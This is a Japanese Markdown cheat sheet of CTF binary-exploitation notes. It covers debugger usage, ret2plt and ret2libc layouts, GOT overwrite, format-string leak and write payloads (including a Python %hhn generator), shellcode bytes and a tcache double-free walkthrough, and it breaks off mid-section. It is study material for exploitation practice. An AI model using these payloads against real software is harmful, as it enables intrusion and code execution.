<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [表層解析](#%E8%A1%A8%E5%B1%A4%E8%A7%A3%E6%9E%90)
- [動的解析](#%E5%8B%95%E7%9A%84%E8%A7%A3%E6%9E%90)
- [静的解析](#%E9%9D%99%E7%9A%84%E8%A7%A3%E6%9E%90)
  - [radare2](#radare2)
  - [gdb](#gdb)
    - [gdb-peda](#gdb-peda)
    - [gdb-pwndbg](#gdb-pwndbg)
    - [gdb-Pwndbg](#gdb-pwndbg)
    - [gdb-gef](#gdb-gef)
  - [Ghidra](#ghidra)
  - [Ollydbg](#ollydbg)
  - [Immunity Debugger](#immunity-debugger)
  - [angr](#angr)
- [exploit](#exploit)
  - [stack base BOF](#stack-base-bof)
  - [スタックアラインメント](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%82%A2%E3%83%A9%E3%82%A4%E3%83%B3%E3%83%A1%E3%83%B3%E3%83%88)
  - [ret2plt](#ret2plt)
  - [ret2libc](#ret2libc)
  - [GOT Overwrite](#got-overwrite)
  - [gadget](#gadget)
    - [one-gadget RCE](#one-gadget-rce)
    - [スタック上に用意したペイロードにjmp](#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E4%B8%8A%E3%81%AB%E7%94%A8%E6%84%8F%E3%81%97%E3%81%9F%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%ABjmp)
  - [format string bug](#format-string-bug)
  - [libc leak](#libc-leak)
    - [stack上のbacktraceを利用](#stack%E4%B8%8A%E3%81%AEbacktrace%E3%82%92%E5%88%A9%E7%94%A8)
  - [Heap](#heap)
    - [double free](#double-free)
    - [Use After Free](#use-after-free)
    - [tcache](#tcache)
      - [malloc時の動作](#malloc%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [free時の動作](#free%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [tcache poisoning](#tcache-poisoning)
      - [tcacheの通常時の動作](#tcache%E3%81%AE%E9%80%9A%E5%B8%B8%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにunsorted_binsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABunsorted_bins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
      - [tcacheの7つ埋めたあとにfastbinsに入る動作](#tcache%E3%81%AE7%E3%81%A4%E5%9F%8B%E3%82%81%E3%81%9F%E3%81%82%E3%81%A8%E3%81%ABfastbins%E3%81%AB%E5%85%A5%E3%82%8B%E5%8B%95%E4%BD%9C)
    - [off-by-one error](#off-by-one-error)
      - [off-by-one-errorでchunk sizeを書き換えてヒープのleak](#off-by-one-error%E3%81%A7chunk-size%E3%82%92%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88%E3%81%A6%E3%83%92%E3%83%BC%E3%83%97%E3%81%AEleak)
      - [off-by-one-errorとHeap leak+tcacheを7つリンク](#off-by-one-error%E3%81%A8heap-leaktcache%E3%82%927%E3%81%A4%E3%83%AA%E3%83%B3%E3%82%AF)
    - [Heap overlap](#heap-overlap)
    - [Heap領域の上書きの利用](#heap%E9%A0%98%E5%9F%9F%E3%81%AE%E4%B8%8A%E6%9B%B8%E3%81%8D%E3%81%AE%E5%88%A9%E7%94%A8)
    - [Heap問のlibc leak](#heap%E5%95%8F%E3%81%AElibc-leak)
    - [Heapでの system("/bin/sh")実行の流れ](#heap%E3%81%A7%E3%81%AE-systembinsh%E5%AE%9F%E8%A1%8C%E3%81%AE%E6%B5%81%E3%82%8C)
    - [C++のvtableの書き換え](#c%E3%81%AEvtable%E3%81%AE%E6%9B%B8%E3%81%8D%E6%8F%9B%E3%81%88)
  - [SEH overflow](#seh-overflow)
    - [Payload実行までの流れ](#payload%E5%AE%9F%E8%A1%8C%E3%81%BE%E3%81%A7%E3%81%AE%E6%B5%81%E3%82%8C)
    - [SafeSEH](#safeseh)
    - [PoC](#poc)
  - [Unicode shellcoding](#unicode-shellcoding)
    - [pop,pop,retの検索](#poppopret%E3%81%AE%E6%A4%9C%E7%B4%A2)
    - [short jmpコードの作成](#short-jmp%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E4%BD%9C%E6%88%90)
    - [Unicode対応のPayloadの作成](#unicode%E5%AF%BE%E5%BF%9C%E3%81%AEpayload%E3%81%AE%E4%BD%9C%E6%88%90)
  - [staged-shellcoding](#staged-shellcoding)
  - [fuzzing (SPIKE)](#fuzzing-spike)
    - [基本](#%E5%9F%BA%E6%9C%AC)
    - [ソケット通信時のパケット](#%E3%82%BD%E3%82%B1%E3%83%83%E3%83%88%E9%80%9A%E4%BF%A1%E6%99%82%E3%81%AE%E3%83%91%E3%82%B1%E3%83%83%E3%83%88)
    - [generic_send_tcp](#generic_send_tcp)
    - [generic_web_server_fuzz2](#generic_web_server_fuzz2)
    - [wireshark](#wireshark)
  - [Egg-Hunter](#egg-hunter)
  - [Omlet-Hunter](#omlet-hunter)
  - [Alpha shellcode](#alpha-shellcode)
    - [badchars](#badchars)
    - [GetPC](#getpc)
    - [encode with sub eaxs](#encode-with-sub-eaxs)
    - [set EIP==REGISTER](#set-eipregister)
    - [Egghunter](#egghunter)
- [よく見るかたまり](#%E3%82%88%E3%81%8F%E8%A6%8B%E3%82%8B%E3%81%8B%E3%81%9F%E3%81%BE%E3%82%8A)
    - [関数の先頭](#%E9%96%A2%E6%95%B0%E3%81%AE%E5%85%88%E9%A0%AD)
    - [関数の終わり](#%E9%96%A2%E6%95%B0%E3%81%AE%E7%B5%82%E3%82%8F%E3%82%8A)
    - [main関数の状態](#main%E9%96%A2%E6%95%B0%E3%81%AE%E7%8A%B6%E6%85%8B)
    - [strcmp](#strcmp)
    - [変数](#%E5%A4%89%E6%95%B0)
  - [覚えておきたい](#%E8%A6%9A%E3%81%88%E3%81%A6%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84)
    - [方針](#%E6%96%B9%E9%87%9D)
    - [起動時の動作](#%E8%B5%B7%E5%8B%95%E6%99%82%E3%81%AE%E5%8B%95%E4%BD%9C)
    - [呼び出し規約](#%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E8%A6%8F%E7%B4%84)
    - [アドレス関係](#%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E9%96%A2%E4%BF%82)
    - [リトルエンディアン](#%E3%83%AA%E3%83%88%E3%83%AB%E3%82%A8%E3%83%B3%E3%83%87%E3%82%A3%E3%82%A2%E3%83%B3)
    - [pwntools](#pwntools)
      - [文字列操作](#%E6%96%87%E5%AD%97%E5%88%97%E6%93%8D%E4%BD%9C)
      - [通信関係](#%E9%80%9A%E4%BF%A1%E9%96%A2%E4%BF%82)
      - [ELF解析](#elf%E8%A7%A3%E6%9E%90)
      - [Rop Chain](#rop-chain)
    - [metasploit](#metasploit)
    - [nasm](#nasm)
      - [bypass badcharacters](#bypass-badcharacters)
        - [NULL bytes](#null-bytes)
        - [above 0x7f](#above-0x7f)
      - [short jmp](#short-jmp)
    - [Windows周り](#windows%E5%91%A8%E3%82%8A)
      - [arwin](#arwin)
      - [mona](#mona)
      - [pvefindaddr](#pvefindaddr)
    - [PE-fileformat](#pe-fileformat)
      - [新しいセクションの作成](#%E6%96%B0%E3%81%97%E3%81%84%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E4%BD%9C%E6%88%90)
      - [文字列参照](#%E6%96%87%E5%AD%97%E5%88%97%E5%8F%82%E7%85%A7)
      - [ベース再配置情報](#%E3%83%99%E3%83%BC%E3%82%B9%E5%86%8D%E9%85%8D%E7%BD%AE%E6%83%85%E5%A0%B1)
    - [alarmのbypass](#alarm%E3%81%AEbypass)
    - [Cの関数](#c%E3%81%AE%E9%96%A2%E6%95%B0)
- [参考文献](#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE)
  - [Heap](#heap-1)
  - [SEH overflow](#seh-overflow-1)
  - [Egg-Hunting](#egg-hunting)
  - [Unicode-encoding](#unicode-encoding)
  - [staged-shellcoding](#staged-shellcoding-1)
  - [fuzzing (SPIKE)](#fuzzing-spike-1)
  - [PE-fileformat](#pe-fileformat-1)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

## 表層解析
- file
- strings
- checksec.sh --file ./file
  - Full RELRO   
  プログラム起動時に共有ライブラリのアドレスをキャッシュ後にGOT領域をReadOnlyにする。GOT Overwriteできない
  - Partial RELRO   
  GOT領域は書き込み可能。GOT(Global Offset Table)は、共有ライブラリの関数のアドレスが保存された領域
  - No RELRO   
  GOT Overwrite可能。
  - ASLR   
  実行ファイルのスタックやヒープ、ライブラリをメモリに配置するときに、アドレスの一部をランダムに配置する   
  ランダム化されるのは、ヒープ・スタック・mmap(共有ライブラリ)で、実行ファイルが配置されるアドレスはランダム化されない。   
- `readelf -r file`   
GOT領域のアドレスを表示   
- `objdump -d -M intel -j .plt file`   
pltのアドレスを表示   
- `one_gadget libc-2.27.so`   
libcに存在する、そこに飛ばすだけでシェルが起動できるOne-gadget RCEを探す。   
前提条件などがある。   
## 動的解析
- ./file (引数)   
引数を変えてみて、入力に対して出力が一対一かどうか確認
- strace ./file (引数)   
システムコールをトレースする
- ltrace ./file (引数)   
標準ライブラリ関数をトレースする   
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `socat TCP-LISTEN:4000,reuseaddr,fork 'system:gdbserver localhost\:5000 ./file' 2> /dev/null &`   
gdbでアタッチできるようにgdbserverで立ち上げる。   
`gdb-peda -ex 'target remote localhost:5000' -ex 'b main' -ex 'c'`   
でアタッチ。   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   

## 静的解析
### radare2
- `radare2 ./binary`
- `afl`   
関数の一覧を表示
- `pdf @main`   
main関数を逆アセンブル   
- `pdd @ main`   
main関数をデコンパイル   
- `s main`   
main関数に移動   
- `VV`   
ヴィジュアルモードでわかりやすく表示してくれる。神。hjklで移動できる   

### gdb
- disas main   
main関数を逆アセンブル
- x/(表示する数)(メモリサイズ bhwg)(表示フォーマット six)(表示するメモリの先頭アドレス *0x08...)   
  - b:BYTE(1バイト)   
  - h:HALFWORD(2バイト)   
  - w:WORD(4バイト)   
  - g:GIANTWORD(8バイト)   
  - s:文字列   
  - i:命令   
  - x:16進数   
  - 例) `x /4wx $rbp-0x90`   
  rbp-0x90のアドレスのメモリ上の値を表示   
  - 例) `x /4wi main+11`,`x /4wi $rip`   
  指定したアドレスから4つ分の命令を表示
- アドレス確認   
   - bt   
   `__libc_start_main`のアドレスを確認 (正確には__libc_stat_main+231など)
   - p system   
   `__libc_system`のアドレスを確認   
   - p &main_arena   
   main_arenaのアドレスを確認   
   - vmmap   
   ```txt
   0x00602000         0x00623000         rw-p	[heap]
   0x00007ffff79e4000 0x00007ffff7bcb000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
   ```
   libc_baseが`0x00007ffff79e4000`とわかる   
 - メモリの書き換え   
   - `set *0x12345678=0x1234`   
   - `set *(char *)0x1233456=0x12`   
   バイト単位で書き換えられる   
#### gdb-peda 
- `gdb-peda ./file`   
- `pdisas main`
色付きで逆アセンブルして見やすい。   
- `nextcall`   
次のcallまで処理を進めてくれる   
- `tel $rbp-8*4 5`   
わかりやすくメモリの状態を表示してくれる   
- `vmmap`   
メモリ内の大体を表示   
- `pattc 200`      
- `patto AAAJ`   
- `dumprop`   
ropに使える、直後にretの存在する命令を探す   
#### gdb-pwndbg
- `gdb-pendbg ./file`   
- `heap`   
- `bins`   
- `arena`   
https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md   
#### gdb-Pwndbg
- `gdb-Pwndbg ./file`   
- `heapinfo`   
https://github.com/scwuaptx/Pwngdb   
#### gdb-gef
- `gdb-gef ./file`   
https://github.com/hugsy/gef   

### Ghidra
- `./ghirdaRun`   
でGhidraを起動。
- `[File]` -> `[import file]`でbinaryをインポート   
- `[Symbol Tree]`(左真ん中) -> `[Functions]`で関数を確認。ダブルクリックでそこに移動。   
- `[Decompile]`(右下) でコンパイル結果を表示   

### Ollydbg
- `[Shift]+[F8]`   
- `[Alt]+E`   
実行可能モジュールのリストを表示   
### Immunity Debugger
- `[F7],[F8]`   
ステップイン、ステップオーバー実行   
- `[Shift]+[F9]`   
例外ハンドラ実行直前で一時停止しているときに、さらに実行する。   
- `[F2]`   
set brakepoint   
- `[Alt]+E`   
実行可能モジュールのリストを表示   
- `[Alt]+M`   
メモリの状態を表示   
一番上を選択した状態で`[Search]`すると上から検索できる。`[Ctrl]+L`で続きを検索。   
- `[Alt]+L`   
log Windowを表示。monaを実行したときとかに見る。   
- `[Search for] -> [Commands Sequences]`   
`[Alt]+M`から右クリックして、`[Dump in CPU]`を選択して、`[CPU]`Windowに任意のアドレスを表示させてから、右クリックで`[Search]`   
`[Ctrl]+L`で次の検索をする。   
```txt
pop r32
pop r32
retn
```
- `CPUで右クリック [View] `   
モジュール一覧が見れる   
- `[Search for] -> [All intermodular calls]`   
モジュール間呼び出しを検索(ws2_32.recvなど)   
- `CPUで[space]`   
命令を編集できる。   
- `CPUで右クリック [Assemble]`   
`call <JMP.&WS2_32.recv>`   
みたいに書かれている命令は、右クリックして`[Assemble]`で   
`call 0040252c`   
みたいに表示しなおせる   
- `Windowで右クリック[Search for] -> [Binary String]`   
文字列の探索。   

### angr
以下でInstall   
```txt
root@tomoki-VirtualBox:/opt# cd angr/
root@tomoki-VirtualBox:/opt/angr# virtualenv ENV
root@tomoki-VirtualBox:/opt/angr# . ENV/bin/activate
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install angr
(ENV) root@tomoki-VirtualBox:/opt/angr# pip3 install -U protobuf
```
`(ENV) root@tomoki-VirtualBox:/opt/angr# python3 /home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/solver-angr.py 
`   
でangrスクリプトを実行して、解析してフラグを表示。   
以下、angrのテンプレート。

```python
import angr
from claripy import *

# バイナリのパスを指定
proj = angr.Project('/home/tomoki/environment/CTF-writeup/ctf4b-2020/mask/mask')

# 8*40 でフラグの最大を40バイトに指定?(これがないと動かなかった)
sym_arg = BVS('sym_arg',8*40)

# mask というファイル名を指定
# state = proj.factory.entry_state()  でもyakisobaはいけた
argv=['mask',sym_arg]
state = proj.factory.entry_state(args=argv)
sm = proj.factory.simgr(state)

# find に Corrent  avoid に wrong という文字列の存在するアドレスを指定
# |      ||   0x000006d2      488d3d2e0a00.  lea rdi, str.Correct        ; 0x1107 ; "Correct!" ; const char *s
# radare2 の 0x6d2 + 0x400000 = 0x4006d2 などとしてアドレスを計算する
sm.explore(find=0x4012cf,avoid={0x4012dd,0x4011a9})

if sm.found:
    for i in sm.found:
        # yakisobaは以下で表示できた
        #print(i.posix.dumps(0))
        # これじゃないとフラグが出なかった
        print(i.solver.eval(sym_arg,cast_to=bytes).decode('utf-8','ignore'))

```
## exploit
### stack base BOF
- `socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./file 2> /dev/null &`   
- `(echo -e "\xf0\xde\xbc\x9a\x78\x56\x34\x12"; cat) | ./file`   
- `python -c "print('A'*4 + '\x78\x56\x34\x12')" | ./file`   
### スタックアラインメント
x86-64の場合、関数を呼び出すときには、`RSP`は必ず16の倍数のアドレスにいなければならない。   
リターンアドレスを書き換えて別の関数を呼び出す際に考慮する必要がある。   
もしそうでない場合、`ret`を入れたり、`push rbp`を無視して16の倍数にそろえる。 
以下は`ret`命令のアドレス`0x4007f0`をFunc1_ret領域に上書きした場合の動作。   
```txt
  4007f0:	c3                   	retq   
overW_ret = 0x4007f0
func_addr = win関数のアドレス

  ret 直前       ->       ret 直後           ->          ret gadget後
RIP = ret命令のアドレス  RIP = 0x4007f0                 RIP = win関数のアドレス
(Low)
|         |             |         |                    |         |
|   ...   |             |   ...   |                    |   ...   |
|   100h  |             |   100h  |                    |   100h  |
|   ...   |             |   ...   |                    |   ...   |
|saved_ebp| __ esp      |saved_ebp|                    |saved_ebp|
|overW_ret| (書き換えた) |overW_ret| (書き換えた) __ esp |overW_ret| (書き換えた)
|func_addr| (書き換えた) |func_addr| (書き換えた)        |func_addr| (書き換えた) __ esp
|  arg2   |             |  arg2   |                    |  arg2   |
|   ...   | __ ebp      |   ...   | __ ebp             |   ...   | __ ebp
|         |             |         |                    |         |
(High)
```
### ret2plt
`printf@plt`とかをリターンアドレスをにセットすると、動的リンクされたライブラリのアドレスを解決してライブラリ内の関数(printf)を実行してくれる。   
libc_printfを知っている必要がない！   
system関数はpltにはない。printf@pltをよく使う？   
`objdump  -d -M intel -j .plt  chall`   
でpltの一覧を取得。   
pltのアドレスは実行ファイル内のアドレスなので有効(ASLR関係ない)。
```txt
# x86
    ret前
|           |
|   100h    |
| saved_ebp | __ esp
| ret_addr  | <- printf@plt
|   arg1    | <- 0x42424242 (printf呼び出し後の偽のリターンアドレス)
|   arg2    | <- buffer変数のアドレス
|   ....    |
|           | __ ebp
|           |

# x86-64
    ret前
|           |
|   100h    |
| saved_rbp | __ rsp
| ret_addr  | <- pop rdi;retへのアドレス
|   arg1    | <- rdiに入れたいGOT printfのアドレス (libc_printfが書き込まれている)
|   arg2    | <- puts@plt
|           | <- addr_main (puts関数のリターンアドレス)
|   ....    |
|           | __ rbp
|           |

```
### ret2libc
動的リンクされたライブラリのアドレスをリターンアドレスにセットして、呼び出す。   
ASLRによって動的リンクされたライブラリはランダム化されるため、libc leakが前提条件。   

### GOT Overwrite
動的リンクされた関数などのアドレステーブルのGOT領域に書いてある関数のアドレスを上書き。   
.pltはGOT領域のアドレステーブルを参照して関数のアドレスを取得する。   
No RELRO, Partial RELEROの場合に有効。   
`readelf -r file`   
で調べる。書かれている関数のアドレスは隣接している。   
```txt
再配置セクション '.rela.plt' at offset 0x4b0 contains 7 entries:
  オフセット      情報           型             シンボル値    シンボル名 + 加数
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000601038  000700000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 atol@GLIBC_2.2.5 + 0
000000601048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
```
例）exitのGOTを書き換えて、mainに飛ばす    
```txt
初回
call exit -> exit@plt+0 ->[exit GOT] -> exit@plt+6 -> .plt -> libc_exit

2回目以降
call exit -> exit@plt+0 ->[exit GOT] -> libc_exit
--------------------------------------------------------------
exit初回呼び出し前

[exit GOT]
000000601050: 4006d6  <- exit@plt+6をはじめは指している

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5> <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 初回はこの処理をして、exitGOTにlibcのアドレスを書きこむ

exitは一度もまだ呼ばれていないのでexitのGOTにはexit@pltのアドレス解決コードへのアドレスが書かれている。
--------------------------------------------------------------
2回目以降のexit呼び出し前

[exit GOT]
000000601050: 0x7ffff7a27120  <- libc_exitが書き込まれている！！

00000000004006d0 <exit@plt>:
  4006d0:	ff 25 7a 09 20 00    	jmp    QWORD PTR [rip+0x20097a]        # 601050 <exit@GLIBC_2.2.5>  <- exit GOTを指している
  4006d6:	68 07 00 00 00       	push   0x7
  4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 2回目以降はこの処理は入らない

```
### gadget
x86-64の場合は、引数はrdi引数から始まるため、スタックにしか書き込めない場合は`pop rdi;ret`によってRDIレジスタに引数にしたい値を書き込むことになる。
#### one-gadget RCE
libcに存在する、そこに実行を移すだけで`/bin/sh`が起動するガジェット。   
それぞれ制約があるが、それほど気にせずに全部試してダメだったら対応すればいいらしい。   
```txt
takabaya-shi@takabayashi-VirtualBox:~/$ one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
takabaya-shi@takabayashi-VirtualBox:~/$
```
#### スタック上に用意したペイロードにjmp
SEH bofなどでは、スタックの最後の方の小さいスペースしか残らずペイロード実行ができないため、サイズの大きい領域に書き込んだペイロードを実行するために、`jmp-0x300`命令などでそのペイロードのあるスタックのアドレスにジャンプすることが多い。   
その際、スタックのアドレスはランダム化されており、わからないため、相対アドレスで参照することになる。   
```txt
# $baddata .= "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";

\x59			POP ECX      <- [2] call命令によってpushされたアドレスをECXに代入。スタックのアドレスが入る
\xFE\xCD		DEC CH     <- [3] (ECX-256)と同じ
\xFE\xCD		DEC CH     <- [4] (ECX-256)と同じ
\xFE\xCD		DEC CH     <- [5] (ECX-256)と同じ
\xFF\xE1		JMP ECX    <- [6] popしたECX-758のアドレスにjmpして、ここに設置したペイロードを実行！
\xE8\xF2\xFF\xFF\xFF	CALL [relative -0D] <- [1] まずここにjmpしてcall $-0xdを呼び出す(前提条件)
                                             この命令の存在する次のアドレスをESPの指すアドレスにpushする
                                             この命令をスタック上で実行することを前提としているため、次のpopでスタックのアドレスが手に入る
```
### format string bug
以下のようにフォーマットが指定されていない場合に有効。   
```txt
printf(buf)
```
また、ret2pltなどでprintf関数を呼び出した際にも有効！！   
`%p`の場所は、x64の場合は5まではrsi,rdx,..のレジスタの内容で、6以降rspになるらしいので、`sub rsp YY`と`rbp-0xXX`を対応させて逆算するらしい。   
- `%p`   
スタック上のデータをvoid\*型として16進数で表示   
- `%n$p`   
スタック上の何番目のデータをvoid\*型として16進数で表示するかを指定することができる   
- `%x`   
スタック上にある値をそのまま出力する   
- `%d`   
スタック上にある値を整数として出力する   
`%4d`として出力幅を指定すると、4バイトになるように足りない分は空白で埋めて表示する。   
- `%s`   
スタック上にある値をポインタとして読み込んで表示   
- `%c`   
文字を出力する書式指定子。でもなんか0x41414141みたいなものを表示できた時もある(%pと入れ替わってるみたいな感じになってた…???)   
```txt
>>> conn.sendline("N"*8 + ",%c"*30) <- x86-64の場合は8バイト分入力すると8個目に0x4141414141414141がでた
>>> conn.recvline()
'AAAAAAAA,0x7fffffffdd10,(nil),0x7ffff7af4081,0x7ffff7dd18c0,0x7ffff7fe14c0,(nil),0x100,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0xa7025,(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil),(nil)\n'

>>> conn.sendline("N"*8 + ",%8$c"+",%9$c"+",%10$c"+",%24$c")
>>> conn.recvline()
'AAAAAAAA,0x4141414141414141,0x39252c702438252c,0x70243031252c7024,(nil)\n'
```
- `%n`   
printfが呼ばれてから%nを見つけるまでに出力された文字数を引数のポインタに書き込む   
既知の任意のアドレスに書き込むことができる。   
入力した文字列に対応する引数が何番目かを特定して、任意のアドレス(最後の方に呼ばれる関数のGOT領域が多い)にone-gadget-rceなどを書き込む。   
その際に、libcのアドレスが必要なため、以下の手順を取るのが定石？   
- [1] スタック上にあるlibc_start_mainのアドレスをリーク (1回目のFSB)   
- [2] 最後に呼ばれる関数(exitなど)をmainに書き換えてループ　(1回目のFSB)   
- [3] 最後に呼ばれる関数(exitなど)をone-gadget-rceに書き換える (2回目のFSB)   
```txt
0x7fffffff_12345678に書き込みたい場合、
    \x78\x56\x34\x12\xff\xff\xff\x7f%9$n
とする。

    \x78\x56\x34\x12\xff\xff\xff\x7f%9$c
とすると、
0x7fffffff12345678が引数として設定されて、このアドレスに書き込むことができるようになる！

%43$nとかで、スタック上のリターンアドレスに書き込むことはできない。
スタック上のリターンアドレスを%43$cでleakできたとしても、このアドレスを引数にとることはできない？？   
-> できる！が、Partial RELROの場合はlibc_start_mainには書き込めない！！
(仮にできたとしても、スタック上じゃなくてlibc_start_mainのアドレスに書き込むことになるので良くなさそう)
-> スタック上に、スタック上のポインタがあれば、任意のアドレスに書き込める！
例）
0x7fffffffde90 | 0x7fffffffdff0
       ~
0x7fffffffdff0 | 0
となっている場合、2回のFSBで任意のアドレスに書き込める。

[1] 0x7fffffffdff0をprintfのポインタの引数として、このアドレスに0xdeadbeefを書き込む
[2] 0xdeadbeefをprintfのポインタの引数として、このアドレスに任意の値を書き込める！
```
- `%hn`   
２バイトだけ書き込む   
- `%hhn`   
1バイトだけ書き込む   
```python
# 参考 https://kusano-k.hatenadiary.com/entry/20140302/1393781714

from sys import *
from struct import *
T = [
    (0x080497fc, ord('h')),
    (0x080497fd, ord('a')),
    (0x080497fe, ord('c')),
    (0x080497ff, ord('k')),
]

# 書き込む文字列の先頭がprintfのoffset+1番目の引数
offset = 4

code = "".join(pack("I",t[0]) for t in T)  # "I"にすると4bytes, "l"にすると8bytes
#"I" '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08'
#"l" '\xfc\x97\x04\x00\x00\x00\x00\x00\xfd\x97\x84\x00\x00\x00\x00\x00\xfe\x97\x04\x08\x00\x00\x00\x00\xff\x97\x04\x08\x00\x00\x00\x00'

# 出力した文字数
n = len(code)

for i in range(len(T)):
    l = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(l, offset+i)
    n += l

print >>stderr, "code:", repr(code)
print code
# '\xfc\x97\x04\x00\xfd\x97\x84\x00\xfe\x97\x04\x08\xff\x97\x04\x08%88c%4$hhn%249c%5$hhn%2c%6$hhn%8c%7$hhn'
```
### libc leak
#### stack上のbacktraceを利用
stack上にはバックトレースという、エラー時にどの関数を呼んだのかをわかるようにするための情報が保存される。   
これをret2pltなどのprintfのFSBでleakする。   
```txt
gdb-peda$ bt
#0  0x0000000000400818 in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x40079e <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040061a in _start ()
gdb-peda$ tel 0x00007ffff7a05b97 1
0000| 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)

libc_start_main = 0x7ffff7a05b97 -231
libc_base = libc_start_main - offset_libc_start
```

### Heap
#### double free
libc2.29より前のtcacheにはdouble freeのチェックがなく、任意のアドレスに任意の値を書き込むことができる！   
```txt
B=malloc(0x88); "a"を書き込む;
free(B);                      <- [1]
free(B);                      <- [2] fdにHeapアドレスが書き込まれる [double free]
show(B);                      <- [3] Heapアドレスのleak!!!         [Use After Free]
malloc(0x88);"A"*8を書き込む;  <- [4] 
malloc(0x88);"B"*8を書き込む;  <- [5] "AAAAAAAA"アドレスに値("BBBBBBBB")を書き込める！
----------------------------------------------------------------------------------------
[1]free(B); 後

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x0

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000000000000000	0x6161616161616161

------------------------------------- ---------------------------------------------------
[2]free(B); 後 (double free)

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x555555757650

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000555555757650	0x6161616161616161 <- このchunkのfdにchunk自体のアドレスが！

double freeでtcache[0x90]がこのような状態になる！
----------------------------------------------------------------------------------------
[3]show(B);  (Use After free)

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x555555757650

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x0000555555757650	0x6161616161616161 <- UAFより、このアドレスをshowできる！

Use After Freeはfreeしたchunkに参照できる脆弱性。
今回は、BをfreeしたのでBにはもう参照できなくするべき！
しかし、malloc(B)が返したアドレスが保持されているため再度アクセスでき、中身を見れてしまう！
----------------------------------------------------------------------------------------
[4]malloc(0x88);"A"*8を書き込む;後

tcachebins
0x90 [  1]: 0x555555757650  ◂— 0x4141414141414141

0x555555757630:	0x6161616161616161	0x6161616161616161
0x555555757640:	0x0000000000000000	0x0000000000000091 
0x555555757650:	0x4141414141414141	0x6161616161616161 <- このchunkのfdに任意の値を書き込める！

次に0x90sizeをmallocするとmallocは0x4141414141414141を返す！
----------------------------------------------------------------------------------------
[5]malloc(0x88);"B"*8を書き込む;後

tcachebins
0x90 [  1]:  0x4141414141414141

0x4141414141414141:　0x4242424242424242	0x????????????????? <- 0x4141414141414141に任意の値を書き込めた！ 

```
libc2.28以降はkeyメンバが追加されているため、double freeしにくい状況になっている。   
```txt
[1] free後

tcachebins
